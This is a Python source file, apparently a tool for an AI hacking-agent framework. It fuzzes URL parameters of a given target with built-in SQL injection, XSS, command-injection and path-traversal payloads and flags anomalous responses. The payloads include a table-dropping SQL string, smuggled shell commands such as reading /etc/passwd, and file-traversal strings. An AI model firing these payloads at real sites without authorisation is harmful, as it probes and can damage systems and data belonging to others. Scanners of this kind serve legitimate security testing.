"""HTTP 参数 Fuzzer 工具：对 URL 参数注入 fuzz 字典，检测异常响应"""
import asyncio
import re
from typing import Any, Dict, List
from urllib.request import Request, urlopen
from urllib.parse import urlencode, urlparse, parse_qs
from urllib.error import HTTPError
from tools.base import BaseTool, ToolResult


# 内置 fuzz 字典（精简版）
DEFAULT_PAYLOADS = {
    "sqli": [
        "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1'--",
        "1 UNION SELECT NULL--", "' AND 1=1--", "'; DROP TABLE users--",
        "1' AND SLEEP(3)--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "'\"><svg/onload=alert(1)>", "javascript:alert(1)",
        "<body onload=alert(1)>",
    ],
    "cmd": [
        "; ls", "| id", "$(whoami)", "`id`", "; cat /etc/passwd",
        "| ping -c 1 127.0.0.1",
    ],
    "path": [
        "../../../etc/passwd", "....//....//etc/passwd",
        "/etc/passwd%00", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
}

# 异常检测关键词
ERROR_PATTERNS = [
    r"SQL syntax", r"mysql_fetch", r"ORA-\d+", r"PostgreSQL.*ERROR",
    r"ODBC.*Driver", r"Microsoft.*ODBC", r"Unclosed quotation mark",
    r"<script>alert", r"onerror=", r"root:[x*]:\d+",
    r"uid=\d+", r"bin/bash", r"Exception|Traceback|Stack trace",
]


class ParamFuzzerTool(BaseTool):
    """HTTP 参数 Fuzzer（检测注入类漏洞）"""

    sensitivity = "high"

    def __init__(self):
        super().__init__(
            name="param_fuzzer",
            description=(
                "对目标 URL 的参数进行 Fuzz 测试，注入 SQL/XSS/命令注入/路径穿越等 payload，"
                "通过响应差异检测潜在漏洞。"
                "参数: url(目标 URL), params(要测试的参数名列表,可选,默认自动提取), "
                "categories(测试类别列表: sqli/xss/cmd/path, 默认全部)"
            ),
        )

    async def execute(self, **kwargs) -> ToolResult:
        url = kwargs.get("url", "").strip()
        params = kwargs.get("params", [])
        categories = kwargs.get("categories", list(DEFAULT_PAYLOADS.keys()))

        if not url:
            return ToolResult(success=False, result=None, error="缺少参数: url")

        # 如果没有指定参数，从 URL 中提取
        if not params:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            params = list(qs.keys())

        if not params:
            return ToolResult(success=False, result=None, error="URL 中未发现可测试的参数，请通过 params 指定")

        if isinstance(categories, str):
            categories = [categories]

        loop = asyncio.get_event_loop()

        # 先获取基准响应
        try:
            baseline = await loop.run_in_executor(None, lambda: self._request(url))
        except Exception as e:
            return ToolResult(success=False, result=None, error=f"无法获取基准响应: {e}")

        # 对每个参数 + 每类 payload 进行测试
        findings = []
        tested = 0

        for param in params:
            for cat in categories:
                payloads = DEFAULT_PAYLOADS.get(cat, [])
                for payload in payloads:
                    tested += 1
                    try:
                        fuzz_url = self._inject_param(url, param, payload)
                        resp = await loop.run_in_executor(None, lambda u=fuzz_url: self._request(u))

                        anomalies = self._detect_anomaly(baseline, resp, cat)
                        if anomalies:
                            findings.append({
                                "param": param,
                                "category": cat,
                                "payload": payload,
                                "anomalies": anomalies,
                                "status_code": resp.get("status"),
                                "response_length": resp.get("length"),
                            })
                    except Exception:
                        pass

        return ToolResult(
            success=True,
            result={
                "url": url,
                "params_tested": params,
                "categories": categories,
                "total_tests": tested,
                "findings_count": len(findings),
                "findings": findings[:50],
                "risk_level": "high" if findings else "low",
            },
        )

    def _request(self, url: str, timeout: int = 10) -> Dict:
        """发送 HTTP 请求并返回基本信息"""
        req = Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (compatible; HackBot-Fuzzer/1.0)")
        try:
            with urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode(errors="ignore")
                return {
                    "status": resp.status,
                    "length": len(body),
                    "body": body[:5000],
                    "headers": dict(resp.headers),
                }
        except HTTPError as e:
            body = e.read().decode(errors="ignore") if e.fp else ""
            return {
                "status": e.code,
                "length": len(body),
                "body": body[:5000],
                "headers": dict(e.headers) if e.headers else {},
            }

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """将 payload 注入到指定参数"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode({k: v[0] for k, v in qs.items()})
        return parsed._replace(query=new_query).geturl()

    def _detect_anomaly(self, baseline: Dict, response: Dict, category: str) -> List[str]:
        """检测响应异常"""
        anomalies = []

        # 状态码变化
        if response["status"] != baseline["status"]:
            anomalies.append(f"状态码变化: {baseline['status']} -> {response['status']}")

        # 响应长度显著变化
        if baseline["length"] > 0:
            ratio = abs(response["length"] - baseline["length"]) / baseline["length"]
            if ratio > 0.5:
                anomalies.append(f"响应长度显著变化: {baseline['length']} -> {response['length']}")

        # 错误关键词匹配
        body = response.get("body", "")
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                anomalies.append(f"响应中匹配到敏感模式: {pattern}")

        return anomalies

    def get_schema(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "sensitivity": self.sensitivity,
            "parameters": {
                "url": {"type": "string", "description": "目标 URL（含参数）", "required": True},
                "params": {"type": "array", "description": "要测试的参数名列表（可选，默认自动提取）", "required": False},
                "categories": {"type": "array", "description": "测试类别: sqli/xss/cmd/path（默认全部）", "required": False},
            },
        }
